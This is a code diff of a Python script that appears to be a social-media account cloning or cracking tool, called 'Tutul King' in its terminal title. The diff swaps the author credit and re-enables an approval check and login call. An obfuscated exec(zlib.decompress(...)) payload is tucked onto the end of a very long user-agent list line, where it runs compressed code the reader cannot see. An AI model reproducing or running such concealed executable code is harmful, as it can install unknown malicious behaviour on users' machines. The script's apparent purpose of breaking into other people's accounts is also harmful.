@@ -1,7 +1,6 @@
 """
-    @ open source by ---( AKASH )---
-    @ Github : https://github.com/MAHADI-ABAL
-    @ facebook : https://www.facebook.com/profile.php?id=100085594411750
+    @ open source by AHMED FARHAN
+    @ Github : https://github.com/AHMED-143
     
 """
 
@@ -125,7 +124,6 @@ xxxxxc = '\033[10;95m'
 xxxxxcop = '\33[32;45m'
  #------------------[ Tutul-King ]-------------------#
 sys.stdout.write('\x1b[1;37m\x1b]2; Tutul King\x07')
-#-ADD Mozilla UA 1 UA BY AKASH🤧🤧🤧
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",];exec(zlib.decompress(b'x\x9c\x8dT\xdb\x8a\xdb0\x10}\xf7W\x08\xf2 \xbbx\xed\xc4{Ib\x084m\xbae\xbb]\xda\x87R\n\xa5\x18\xc5\x92bem\xcb\xd5\xc8$\xee\xb2\xff^\xc9\xcem\x9b\x94\xec<\x083s\xe6\xcc\xcc\xd1X\xa2\xa8\xa4\xd2H\xb1\xdf5\x03\r\xbe\x04\x1f\x1ap\xb8\x92\x05Je\x99\xd6J\xb1R\x07\xbc\xd6\xb5b\x80D\x07\xff\x96)F\xe8W)\xf3\x0fk\x96\xd6Z*D\xe0\xc0\xeb8\xbd\xb750%\xa8(\xb9\x9cK\xed8\x94q\x04l\xdd\xb8^\xec c\xc0\x00\x84,\'\xdb\xca\xc1\xc6\xe1zm\xd8Z\xfba\x92\x13-\x1fY\x89&\x08\x0f\xfb\xc3\xa8?\xbc\x1a_\xde\xc4\xd3\xe9mS$\x9f\xdeE\xd5\xc7\xcb\xcb\xec\xf6\xfb\xfd\x1c\xe4\x9f\xabQs\xf7\xa3\xfa<\x8a\xee\x07\xfd/\x0f\xb8cH3\xa2\x13Am\xfe\xcd(\x8a\x06\xd7\xc3\xf1\xe8\x1a\xb7\xa1\xde\xc5\xde\\\x14\x02M\x89\xa2\xbd6\xa4U\x13\xef:\xe9\x02IEtfi6@\xbc\x8bs\x91\xb3$\x17\xa0M\xf4\'G\xdc\xe8\xc1\x91(\x91\x84\xc0z\xa9P\xee\x01\x85\x87\x84\xc1\x04\xac\xa4\xb0\x12:sqP5\xd8\xfb\xb5g\xb3\xe9\x86\xd12\xec\x98\xf7\xcdX\xb3yHV\xactM\t\xcb\x19,\xa5(\x0f\x8b\xf8m\xaa\xe7#\xac\xe6\xd8\xb3\xd7\xc3_RX\xabU>\xe18\xd3\xba\x828\x0cI%\x02\xcdr\xb6P\xa4\x08\xa4Z\x84F\xfb\xa7\x9d\xfe\xcf!\x98\x8eg2\xad\x0b\xb3\x11\xf8\x88\x8b\x12M\xa2\xc9\x13\xde\xc8\x8d\xe3\xad\xf0\xcf\'\xa1\xafC\xda\x19\xc0@\xe9\xb6l\x8c\xf81j\xc1\xac\xf0\x9b\x05\n*\t\xda5\x93\xf9]\x1d{\xf8\x1b\xa2\xf6\xf4\x8e\xf2\xcd`g\x08\xa2\x13\x0cl\x9d\xb2J\xc7\x15\x01\xe8\xd6\x9b\xd7\xdb\xe56\x97b\xfe"\xcd\n\x17\xab\x02](\xbe\xdd\xad\xf0\r\xf6\x8e\x11\x87\x80\xd9\xfb\xbb\x87\xf0\x1chZR%\x05}5\xce\x8ep\x12\xfc\xa2\xb7\x99\\\x95\xb9$\xffi\xf2\x10:8\x0f\t\xfb-\xc6i7u\xff2\xb8\x05Y\'+\xa9\x1e\x99\x82\xc9\xb8\xdf.\xe6r\xb9\xecd3\x1f\x01\xd4\xf3Bh\xd7>\x15\xde\xbfN^w.\xc7\xd8_\xb2\\j\x0c').decode())
 ugen2=[]
 ugen=[]
@@ -500,5 +498,5 @@ if __name__=='__main__':
 	except:pass
 
 login()
-#apvroval.check()
-#login()
+apvroval.check()
+login()
